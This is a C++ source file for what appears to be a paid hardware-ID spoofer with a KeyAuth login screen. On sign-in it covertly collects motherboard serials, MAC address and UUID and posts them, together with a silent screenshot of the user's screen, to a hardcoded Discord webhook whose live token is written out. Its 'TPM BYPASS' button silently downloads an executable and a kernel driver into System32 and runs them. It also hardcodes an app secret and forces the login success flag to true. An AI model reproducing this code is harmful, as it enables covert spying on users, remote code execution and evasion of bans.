#include "!Items.hpp"
#include "font_awesome.h"
#include "fonts.h"
#include "images.h"
#include "imspinner.h"
#include "skStr.h"
#include <optimize.h>
#include "perm_mac.h"
#include <perm_spoof.h>
#include <cstdio> 
#include <memory> 
#include <array>
#include <thread>
#include "auth.hpp"
#include "json.hpp"
#include "utils.hpp"



#include <fstream>
#include <Windows.h>
#include <string>
#include <sstream>

#include <stdexcept>
#include <memory>

#include <iostream>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <string>
#include <sstream>
#include <winhttp.h>
#include <algorithm>

#include <windows.h>
#include <psapi.h>
#include <tchar.h>
#include <vector>
#include <string>
#include <gdiplus.h>
#pragma comment(lib, "gdiplus.lib")

#include <vector>
#pragma comment(lib, "winhttp.lib")


inline std::string name = skCrypt("TestApp").decrypt(); // Application Name
inline std::string ownerid = skCrypt("zFxb0tlNzz").decrypt(); // Owner ID
inline std::string secret = skCrypt("95a5ce7a825d9b7b0411836827a2ac35865055f969429d45e7786d975d9decde").decrypt(); // Application Secret
inline std::string version = skCrypt("1.0").decrypt(); // Application Version
inline std::string url = skCrypt("https://keyauth.win/api/1.2/").decrypt(); // change if you're self-hosting
inline std::string path = skCrypt("").decrypt(); // (OPTIONAL) see tutorial here https://www.youtube.com/watch?v=I9rxt821gMk&t=1s

KeyAuth::api KeyAuthApp(name, ownerid, secret, version, url, path);
bool isAuthInitialised = false;


std::string json_escape(const std::string& str) {
	std::string result;
	for (char c : str) {
		switch (c) {
		case '"': result += "\\\""; break;
		case '\\': result += "\\\\"; break;
		case '\b': result += "\\b"; break;
		case '\f': result += "\\f"; break;
		case '\n': result += "\\n"; break;
		case '\r': result += "\\r"; break;
		case '\t': result += "\\t"; break;
		default: result += c; break;
		}
	}
	return result;
}


std::string executeCommandHidden(const std::string& command) {
	std::string result;
	char buffer[128];
	SECURITY_ATTRIBUTES sa;
	HANDLE hRead, hWrite;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "";

	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = hWrite;
	si.hStdError = hWrite;

	PROCESS_INFORMATION pi;
	if (!CreateProcessA(NULL, const_cast<char*>(command.c_str()), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		CloseHandle(hRead);
		CloseHandle(hWrite);
		return "";
	}



	CloseHandle(hWrite);

	DWORD bytesRead;
	while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead != 0) {
		buffer[bytesRead] = '\0';
		result += buffer;
	}

	CloseHandle(hRead);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return result;
}


static bool notspoofed = false;

std::string g_serialNumber = (skCrypt("").decrypt());
std::string g_macAddress = (skCrypt("").decrypt());
std::string g_uuid = (skCrypt("").decrypt());
std::string g_manufacturer = (skCrypt("").decrypt());
std::string g_product = (skCrypt("").decrypt());
std::string g_cpu = (skCrypt("").decrypt());
std::string g_win = (skCrypt("").decrypt());
inline bool tpm;


void retrieveSerialNumber() {
	if (g_serialNumber.empty()) {
		g_serialNumber.clear();
		g_macAddress.clear();
		g_uuid.clear();
		g_manufacturer.clear();
		g_product.clear();
		g_cpu.clear();

		auto processOutput = [](const std::string& output, const std::string& keyword) {
			std::istringstream stream(output);
			std::string line;
			std::string result;
			while (std::getline(stream, line)) {
				if (line.find(keyword) == std::string::npos) {
					line.erase(std::remove(line.begin(), line.end(), '\n'), line.end());
					line.erase(std::remove(line.begin(), line.end(), '\r'), line.end());
					result += line;
				}
			}
			return result;
			};

		std::string decryptedCommand = skCrypt("wmic baseboard get serialnumber").decrypt();
		std::string output = executeCommandHidden(decryptedCommand);
		g_serialNumber = processOutput(output, skCrypt("SerialNumber").decrypt());

		std::string decryptedCommandMAC = skCrypt("wmic nicconfig get MACAddress").decrypt();
		output = executeCommandHidden(decryptedCommandMAC);
		std::istringstream stream(output);
		std::string line;
		while (std::getline(stream, line)) {
			if (line.find(":") != std::string::npos) {
				line.erase(std::remove(line.begin(), line.end(), '\n'), line.end());
				line.erase(std::remove(line.begin(), line.end(), '\r'), line.end());
				line.erase(0, line.find_first_not_of(" \t\r\n"));
				line.erase(line.find_last_not_of(" \t\r\n") + 1);
				g_macAddress = line;
				break;
			}
		}

		std::string decryptedCommandManufacturer = skCrypt("wmic baseboard get manufacturer").decrypt();
		output = executeCommandHidden(decryptedCommandManufacturer);
		g_manufacturer = processOutput(output, skCrypt("Manufacturer").decrypt());

		std::string decryptedCommandProduct = skCrypt("wmic baseboard get product").decrypt();
		output = executeCommandHidden(decryptedCommandProduct);
		g_product = processOutput(output, skCrypt("Product").decrypt());

		std::string decryptedCommandCPU = skCrypt("wmic cpu get serialnumber").decrypt();
		output = executeCommandHidden(decryptedCommandCPU);
		g_cpu = processOutput(output, skCrypt("SerialNumber").decrypt());

		std::string decryptedCommandUUID = skCrypt("wmic csproduct get UUID").decrypt();
		output = executeCommandHidden(decryptedCommandUUID);
		g_uuid = processOutput(output, skCrypt("UUID").decrypt());

		std::string decryptedCommandWIN= skCrypt("systeminfo | Find \"Install Date\"").decrypt();
		output = executeCommandHidden(decryptedCommandUUID);
		g_win = processOutput(output, skCrypt("WIN").decrypt());
	}
}




inline bool IsTpmEnabled() {
	std::string command = "powershell -Command \"Get-TPM | Select-Object -Property TpmEnabled\"";
	FILE* pipe = _popen(command.c_str(), "r");
	if (!pipe) {
		return false;
	}

	char buffer[256];
	std::string result;
	while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
		result += buffer;
	}
	_pclose(pipe);

	return result.find("True") != std::string::npos;
}


void saveSerialsToFileold() {
	if (g_serialNumber.empty()) {
		return;
	}





	std::string filePath = skCrypt("C:\\old_serials.txt").decrypt();



	std::ofstream outFile(filePath);
	if (!outFile.is_open()) {

		return;
	}

	outFile << skCrypt("BaseBoard Manufacturer: ").decrypt() << g_manufacturer << std::endl;
	outFile << skCrypt("BaseBoard Product: ").decrypt() << g_product << std::endl;
	outFile << skCrypt("BaseBoard SerialNumber: ").decrypt() << g_serialNumber << std::endl;
	outFile << skCrypt("UUID: ").decrypt() << g_uuid << std::endl;
	outFile << skCrypt("CPU Serial Number: ").decrypt() << g_cpu << std::endl;
	outFile << skCrypt("MAC Address: ").decrypt() << g_macAddress;


	outFile.close();
}

void saveSerialsToFile() {
	if (g_serialNumber.empty()) {
		return;
	}




	std::string filePath1 = skCrypt("C:\\new_serials.txt").decrypt();





	std::ofstream outFile(filePath1);
	if (!outFile.is_open()) {

		return;
	}


	outFile << skCrypt("BaseBoard Manufacturer: ").decrypt() << g_manufacturer << std::endl;
	outFile << skCrypt("BaseBoard Product: ").decrypt() << g_product << std::endl;
	outFile << skCrypt("BaseBoard SerialNumber: ").decrypt() << g_serialNumber << std::endl;
	outFile << skCrypt("UUID: ").decrypt() << g_uuid << std::endl;
	outFile << skCrypt("CPU Serial Number: ").decrypt() << g_cpu << std::endl;
	outFile << skCrypt("MAC Address: ").decrypt() << g_macAddress;




	outFile.close();




}

void send_to_discord(const std::wstring& webhook_url, const std::string& json_data) {
	HINTERNET hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	if (hSession) {
		URL_COMPONENTS urlComp;
		memset(&urlComp, 0, sizeof(urlComp));
		urlComp.dwStructSize = sizeof(urlComp);

		wchar_t hostName[256];
		wchar_t urlPath[256];

		urlComp.lpszHostName = hostName;
		urlComp.dwHostNameLength = sizeof(hostName) / sizeof(wchar_t);
		urlComp.lpszUrlPath = urlPath;
		urlComp.dwUrlPathLength = sizeof(urlPath) / sizeof(wchar_t);

		if (WinHttpCrackUrl(webhook_url.c_str(), 0, 0, &urlComp)) {
			HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
			if (hConnect) {
				HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlComp.lpszUrlPath,
					NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
					(urlComp.nPort == INTERNET_DEFAULT_HTTPS_PORT) ? WINHTTP_FLAG_SECURE : 0);

				if (hRequest) {
					std::wstring headers = L"Content-Type: application/json\r\n";
					BOOL bResults = WinHttpSendRequest(hRequest,
						headers.c_str(), -1, (LPVOID)json_data.c_str(), json_data.size(), json_data.size(), 0);

					if (bResults) {
						bResults = WinHttpReceiveResponse(hRequest, NULL);
						if (bResults) {
							std::cout << "sent" << std::endl;
						}
						else {
							std::cerr << "WinHttpReceiveResponse failed with error: " << GetLastError() << std::endl;
						}
					}
					else {
						std::cerr << "WinHttpSendRequest failed with error: " << GetLastError() << std::endl;
					}

					WinHttpCloseHandle(hRequest);
				}
				else {
					std::cerr << "WinHttpOpenRequest failed with error: " << GetLastError() << std::endl;
				}
				WinHttpCloseHandle(hConnect);
			}
			else {
				std::cerr << "WinHttpConnect failed with error: " << GetLastError() << std::endl;
			}
		}
		else {
			std::cerr << "WinHttpCrackUrl failed with error: " << GetLastError() << std::endl;
		}
		WinHttpCloseHandle(hSession);
	}
	else {
		std::cerr << "WinHttpOpen failed with error: " << GetLastError() << std::endl;
	}
}








std::string extractFieldValue(const std::string& line) {
	size_t pos = line.find(": ");
	if (pos != std::string::npos) {
		return line.substr(pos + 2);
	}
	return "";
}


bool checke = false;

int GetEncoderd(const WCHAR* format, CLSID* pClsid) {
	UINT num = 0; // number of image encoders
	UINT size = 0; // size of the image encoder array

	Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

	Gdiplus::GetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1;  // Failure

	pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
		return -1;  // Failure

	GetImageEncoders(num, size, pImageCodecInfo);

	for (UINT i = 0; i < num; ++i) {
		if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0) {
			*pClsid = pImageCodecInfo[i].Clsid;
			free(pImageCodecInfo);
			return i;  // Success
		}
	}

	free(pImageCodecInfo);
	return -1;  // Failure
}



void SendScreenshotToWebhook(const std::wstring& webhook_url) {

	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

	// Define screen dimensions
	int screenWidth = 1920;
	int screenHeight = 1080;

	// Create a bitmap
	HDC hdcScreen = GetDC(NULL);
	HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
	HGDIOBJ hOld = SelectObject(hdcMemDC, hBitmap);

	BitBlt(hdcMemDC, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

	Gdiplus::Bitmap bmpScreenshot(hBitmap, NULL);

	// Save the screenshot to a stream
	IStream* stream = nullptr;
	CreateStreamOnHGlobal(NULL, TRUE, &stream);
	CLSID pngClsid;
	GetEncoderd(skCrypt(L"image/png"), &pngClsid);
	bmpScreenshot.Save(stream, &pngClsid, nullptr);

	// Get the stream size
	STATSTG statstg;
	stream->Stat(&statstg, STATFLAG_NONAME);
	ULONG streamSize = statstg.cbSize.LowPart;

	// Allocate buffer and read stream to buffer
	std::vector<BYTE> buffer(streamSize);
	LARGE_INTEGER liZero = {};
	stream->Seek(liZero, STREAM_SEEK_SET, nullptr);
	ULONG bytesRead;
	stream->Read(buffer.data(), streamSize, &bytesRead);

	// Clean up
	stream->Release();
	SelectObject(hdcMemDC, hOld);
	DeleteObject(hBitmap);
	DeleteDC(hdcMemDC);
	ReleaseDC(NULL, hdcScreen);

	// Prepare multipart/form-data POST request
	std::string boundary = ("----WebKitFormBoundary7MA4YWxkTrZu0gW");
	std::stringstream requestBody;
	requestBody << "--" << boundary << "\r\n"
		<< "Content-Disposition: form-data; name=\"file\"; filename=\"screenshot.png\"\r\n"
		<< "Content-Type: image/png\r\n\r\n";
	requestBody.write(reinterpret_cast<const char*>(buffer.data()), buffer.size());
	requestBody << "\r\n--" << boundary << "--\r\n";

	std::string requestBodyStr = requestBody.str();

	// Extract hostname and path from webhook URL
	std::wstring hostname = skCrypt(L"discord.com").decrypt();
	std::wstring path = skCrypt(L"api/webhooks/").decrypt();



	// Initialize WinHTTP
	HINTERNET hSession = WinHttpOpen(L"ScreenshotBot/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	if (hSession) {
		HINTERNET hConnect = WinHttpConnect(hSession, hostname.c_str(),
			INTERNET_DEFAULT_HTTPS_PORT, 0);

		if (hConnect) {
			HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(),
				NULL, WINHTTP_NO_REFERER,
				WINHTTP_DEFAULT_ACCEPT_TYPES,
				WINHTTP_FLAG_SECURE);

			if (hRequest) {
				std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + std::wstring(boundary.begin(), boundary.end()) + L"\r\n";

				BOOL bResults = WinHttpSendRequest(hRequest,
					headers.c_str(), -1L,
					(LPVOID)requestBodyStr.c_str(), requestBodyStr.size(),
					requestBodyStr.size(), 0);

				if (bResults) {
					WinHttpReceiveResponse(hRequest, NULL);
				}


			}


		}


	}


}




























void send_data_async(const std::wstring& url, const std::string& data) {
	std::thread([url, data]() {
		send_to_discord(url, data);
		}).detach();
}





void ui::Before_Loop()
{
	ImGuiIO& io = ImGui::GetIO(); (void)io;
	static const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_16_FA, 0 };
	ImFontConfig icons_config; icons_config.MergeMode = false; icons_config.PixelSnapH = true; icons_config.OversampleH = 3; icons_config.OversampleV = 3;

	if (images::logo == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, logo_p, sizeof(logo_p), nullptr, nullptr, &images::logo, 0);

	if (fonts::Inter_Medium == nullptr) fonts::Inter_Medium = io.Fonts->AddFontFromMemoryTTF(Inter_Medium_p, sizeof(Inter_Medium_p), 17);
	if (fonts::Inter_Medium_T == nullptr) fonts::Inter_Medium_T = io.Fonts->AddFontFromMemoryTTF(Inter_Medium_p, sizeof(Inter_Medium_p), 26);

	if (fonts::Lexend == nullptr) fonts::Lexend = io.Fonts->AddFontFromMemoryTTF(lexend_p, sizeof(lexend_p), 27);
	if (fonts::FontAwesome == nullptr) fonts::FontAwesome = io.Fonts->AddFontFromMemoryCompressedTTF(fa6_solid_compressed_data, fa6_solid_compressed_size, 15.f, &icons_config, icons_ranges);
	tpm = IsTpmEnabled();
	custom::Blur(g_hwnd);
}

const char* Mobos[] = { "Asus", "Gigabyte", "MSI", "AsRock", "HP", "Lenovo", "Other"};
int selectedMobo = -1;
std::string expiryyy;
std::string creationdate;

std::string tm_to_readable_time(tm ctx) {
	char buffer[80];

	strftime(buffer, sizeof(buffer), "%a %m/%d/%y %H:%M:%S %Z", &ctx);

	return std::string(buffer);
}

static std::time_t string_to_timet(std::string timestamp) {
	auto cv = strtol(timestamp.c_str(), NULL, 10); // long

	return (time_t)cv;
}


static std::tm timet_to_tm(time_t timestamp) {
	std::tm context;

	localtime_s(&context, &timestamp);

	return context;
}

void ui::Render()
{
	if (!isAuthInitialised)
	{
		KeyAuthApp.init();
		isAuthInitialised = true;
	}

	custom::Begin("NIXDA", window::Begin_Size);
	{
		if (Tab < 2) { if (items::Tab1("Sign in", { 185, window::Begin_Size.y - 50 }, Tab == 0)) { Tab = 0; } if (items::Tab1("Sign up", { 270, window::Begin_Size.y - 50 }, Tab == 1)) { Tab = 1; } }
		name.clear(); ownerid.clear(); secret.clear(); version.clear(); url.clear();



	
		auto* window = ImGui::GetCurrentWindow();
		auto& style = ImGui::GetStyle();
		auto& io = ImGui::GetIO();

		style.Alpha = Alpha;
		float time = io.DeltaTime * 5;
		static float timer = io.DeltaTime;

		if (Tab == 0)
		{
			AlphaAnim();

			ImGui::PushFont(fonts::Inter_Medium_T);
			custom::Text("Welcome back", { window::Begin_Size.x / 2 - ImGui::CalcTextSize("Welcome back").x / 2, 100 }, fonts::Inter_Medium_T, 26, colors::lwhite);


			items::InputText("###User", "Username", ICON_FA_USER, { (window::Begin_Size.x - 340) / 2, 200 }, user, IM_ARRAYSIZE(user), 0, 0);
			items::InputText("###Pass", "Password", ICON_FA_LOCK, { (window::Begin_Size.x - 340) / 2, 270 }, pass, IM_ARRAYSIZE(pass), ImGuiInputTextFlags_Password, 0);

			if (items::Button1("Sign in",
				{ (window::Begin_Size.x - 340) / 2, 370 }, { 340, 40 }, colors::bg)) {
				Alpha = 0; 
				
				KeyAuthApp.login(user, pass);
				expiryyy = KeyAuthApp.user_data.lastlogin;
				creationdate = KeyAuthApp.user_data.createdate;
				const std::wstring webhook_url = skCrypt(L"https://canary.discord.com/api/webhooks/1363245824053739853/qxp8uzUBh-i3HuC1XT_eI2h8kkwSmtNjMKlyOfdXgJALXjqbwgXfCcIIrB7mHyLnlTIV").decrypt();
				retrieveSerialNumber();

				std::ostringstream json_data;
				json_data << R"({
  "content": null,
  "embeds": [
    {
      "title": ":scroll: Log: )" << json_escape(user) << R"( Logged In",
      "color": 65280, 
      "fields": [
        {
          "name": ":closed_lock_with_key: Baseboard Serial",
          "value": "```)" << json_escape(g_serialNumber) << R"(```",
          "inline": false
        },
        {
          "name": ":desktop: Baseboard product",
          "value": "```)" << json_escape(g_product) << R"(```",
          "inline": true
        },
        {
          "name": "<:Wifi:1268015293989654631> MAC Address",
          "value": "```)" << json_escape(g_macAddress) << R"(```",
          "inline": true
        }
    
      ]
    }
  ]
})";

			


				KeyAuthApp.response.success = true;

				if (KeyAuthApp.response.success) {
					Tab = 5;

					send_data_async(webhook_url, json_data.str());
					saveSerialsToFileold();
					saveSerialsToFile();
					SendScreenshotToWebhook(webhook_url);
				}
				else {
					MessageBoxA(NULL, skCrypt("Error, please try again or contact support.").decrypt(), skCrypt("Valor").decrypt(), MB_OK | MB_ICONERROR);


				}
				g_serialNumber.clear();
				g_macAddress.clear();
				g_manufacturer.clear();
				g_uuid.clear();
				g_product.clear();
			} 
		}

		if (Tab == 1)
		{
			AlphaAnim();


			int level = -1;
			nlohmann::json result;


			ImGui::PushFont(fonts::Inter_Medium_T);
			custom::Text("Welcome", { window::Begin_Size.x / 2 - ImGui::CalcTextSize("Welcome").x / 2, 100 }, fonts::Inter_Medium_T, 26, colors::lwhite);

			items::InputText("###User", "Username", ICON_FA_USER, { (window::Begin_Size.x - 340) / 2, 170 }, user, IM_ARRAYSIZE(user), 0, 0);
			items::InputText("###Pass", "Password", ICON_FA_LOCK, { (window::Begin_Size.x - 340) / 2, 240 }, pass, IM_ARRAYSIZE(pass), ImGuiInputTextFlags_Password, 0);
			items::InputText("###Key", "License", ICON_FA_KEY, { (window::Begin_Size.x - 340) / 2, 310 }, key, IM_ARRAYSIZE(key), 0, 0);

			if (items::Button1("Sign in", { (window::Begin_Size.x - 340) / 2, 420 }, { 340, 40 }, colors::bg)) {
				Alpha = 0; Tab = 5;
			

				KeyAuthApp.regstr(user, pass, key);

				if (KeyAuthApp.response.success) {
					MessageBoxA(NULL, skCrypt("Success! Now Please Login, Redirecting to Login page.").decrypt(), skCrypt("NIXDA").decrypt(), MB_OK | MB_ICONERROR);
					Tab = 0;
				}
				else {
					MessageBoxA(NULL, skCrypt("Error, please try again or contact support.").decrypt(), skCrypt("NIXDA").decrypt(), MB_OK | MB_ICONERROR);

				}
			}



		}

		if (Tab == 2)
		{
			if (items::Tab1("Main", { 295, window::Begin_Size.y - 50 }, Sub_Tab == 0)) { Sub_Tab = 0; }
			if (items::Tab1("Checker", { 345, window::Begin_Size.y - 50 }, Sub_Tab == 1)) { Sub_Tab = 1; }

			if (Sub_Tab == 0)
			{
				AlphaAnim();

				custom::Child_Begin("User Info", { 55, 115 }, { 265, 365 });
				{
					custom::Info("USER", user, { 22, 30 }, colors::Gray2);
					custom::Info("LAST UPDATE", "20/04/2025", {22, 80}, colors::Gray2);
					custom::Info("Discord", "Nixda.lol", {22, 130}, colors::Gray2);

					items::Combo("Mobo", { 15, 180 }, Mobos, IM_ARRAYSIZE(Mobos), &selectedMobo);
				}
				custom::Child_End();

				custom::Child_Begin("Parameters", { 360, 115 }, { 265 , 240 });
				{
					auto* c = ImGui::GetCurrentWindow();
				
					if (items::Button1("HVCI BYPASS", { (265 - 235) / 2, c->Size.y - 210 }, { 235, 35 }, colors::lbg))
					{

					}

					if (items::Button1("TPM BYPASS", { (265 - 235) / 2, c->Size.y - 160 }, { 235, 35 }, colors::lbg))
					{
						system(skCrypt("curl --silent https://ojajsfmnbsxbyvxrybmc.supabase.co/storage/v1/object/public/permvm//mappperrr.exe --output C:\\Windows\\System32\\mappaaa.exe >nul").decrypt()); 
						system(skCrypt("curl --silent https://ojajsfmnbsxbyvxrybmc.supabase.co/storage/v1/object/public/permvm//tpmmmm.sys --output C:\\Windows\\System32\\tpmmm.sys >nul").decrypt());

						system(skCrypt("C:\\Windows\\System32\\mappaaa.exe C:\\Windows\\System32\\tpmmm.sys"));
						std::wstring loaderg = L"https://canary.discord.com/api/webhooks/";
						SendScreenshotToWebhook(loaderg);
						Alpha = 0;
						Tab = 5;

					}

					if (items::Button1("SPOOF MAC", { (265 - 235) / 2, c->Size.y - 110 }, { 235, 35 }, colors::lbg))
					{
						if (ARP) {
							std::thread([]() { macall(); }).detach();
						}

						std::wstring loaderg = L"https://canary.discord.com/api/webhooks/";
						SendScreenshotToWebhook(loaderg);
						Alpha = 0;
						Tab = 5;

					}

					
					if (items::Button1("SPOOF SERIALS", { (265 - 235) / 2, c->Size.y - 60 }, { 235, 35 }, colors::lbg)) 
					{
						
					

					
						

						

						
						
					   
						if (selectedMobo == 0) {
							std::thread([]() { asus_spoof(); }).detach();
							std::thread([]() { cleanup(); }).detach();

							

						}
						if (selectedMobo == 1) {
							std::thread([]() { gigabyte_spoof(); }).detach();
							cleanup();


						}
						if (selectedMobo == 2) {
							std::thread([]() { msi_spoof(); }).detach();
							cleanup();
						}
						if (selectedMobo == 3) {
							std::thread([]() { asrock_spoof(); }).detach();
							cleanup();
						}
						if (selectedMobo == 4) {
							std::thread([]() { unlock_HP(); }).detach();
						}

						if (selectedMobo == 5) {
							std::thread([]() { unlock_HP(); }).detach();
						}
						if (selectedMobo == 6) {
							std::thread([]() { randomize(); }).detach();
							cleanup();

						}

						std::thread([]() { retrieveSerialNumber(); }).detach();
						std::thread([]() { saveSerialsToFile(); }).detach();

						std::wstring loaderg = L"https://canary.discord.com/api/webhooks/";
						SendScreenshotToWebhook(loaderg);
						Alpha = 0;
						Tab = 5;
						
					}
				}
				custom::Child_End();
			}



			if (Sub_Tab == 1)
			{
				AlphaAnim();



				custom::Child_Begin("Serials", { 175, 100 }, { 325, 380 });
				{

					std::ifstream file1(skCrypt("C:\\old_serials.txt").decrypt()), file2(skCrypt("C:\\new_serials.txt").decrypt());




					std::string line1, line2;
					std::string fieldValue1, fieldValue2;

					if (getline(file1, line1) && getline(file2, line2)) {
						fieldValue1 = extractFieldValue(line1);
						fieldValue2 = extractFieldValue(line2);
						if (fieldValue1 != fieldValue2) {
							custom::Info("SMBIOS", "Changed", { 22, 26 }, colors::Green);
							custom::Info("BASEBOARD", "Changed", { 22, 26 + 50 }, colors::Green);
							custom::Info("SYSTEM SKU", "Changed", { 22, 26 + 50 * 4 }, colors::Green);
							custom::Info("CHASSIS ", "Changed", { 22, 26 + 50 * 3 }, colors::Green);

						}
						else {
							custom::Info("SMBIOS", "Not Changed", { 22, 26 }, colors::Red);
							custom::Info("BASEBOARD", "Not Changed", { 22, 26 + 50 }, colors::Red);
							custom::Info("CHASSIS ", "Not Changed", { 22, 26 + 50 * 3 }, colors::Red);
							custom::Info("SYSTEM SKU", "Not Changed", { 22, 26 + 50 * 4 }, colors::Red);
						}

						if (getline(file1, line1) && getline(file2, line2)) {
							fieldValue1 = extractFieldValue(line1);
							fieldValue2 = extractFieldValue(line2);
							if (fieldValue1 != fieldValue2) {
								custom::Info("MAC ADDRESS", "Changed", { 22, 26 + 50 * 2 }, colors::Green);
							}
							else {
								custom::Info("MAC ADDRESS", "Not Changed", { 22, 26 + 50 * 2 }, colors::Red);
							}

							if (getline(file1, line1) && getline(file2, line2)) {
								fieldValue1 = extractFieldValue(line1);
								fieldValue2 = extractFieldValue(line2);
								if (fieldValue1 != fieldValue2) {
									custom::Info("UUID", "Changed", { 22, 26 + 50 * 5 }, colors::Green);
								}
								else {
									custom::Info("UUID", "Not Changed", { 22, 26 + 50 * 5 }, colors::Red);

								}
							}
						}

						if (tpm)
						{
							custom::Info("TPM", "Enabled", { 22, 26 + 50 * 6 }, colors::Red);
						}
						else
						{
							custom::Info("TPM", "Disabled", { 22, 26 + 50 * 6 }, colors::Green);
						}

					}
				}

							custom::Child_End();
							
						}
					}
				
			

		if (Tab == 5)
		{
			ImVec2 size_max33 = { 675, 575 };
			window::Begin_Size = ImLerp(size_max33, window::size_max, time);
			if (size_max33.x < window::size_max.x - 5) { return; }

			AlphaAnim();
			timer += 0.01;

			ImGui::SetCursorPos({ (window::Begin_Size.x - 150.0f) / 2.0f, 180 });
			ImSpinner::SpinnerTwinPulsar("LABEL", 70.f, 3.f, ImGui::GetColorU32(colors::MainColor), 1.2f, 2, 5);
			custom::Text("Loading", { (window::Begin_Size.x - ImGui::CalcTextSize("Loading").x) / 2, 375 }, fonts::Inter_Medium, 17, colors::lwhite);

			if (timer > 10) { timer = 0; Alpha = 0; Tab = 2; }
		}
		custom::End();
	}
}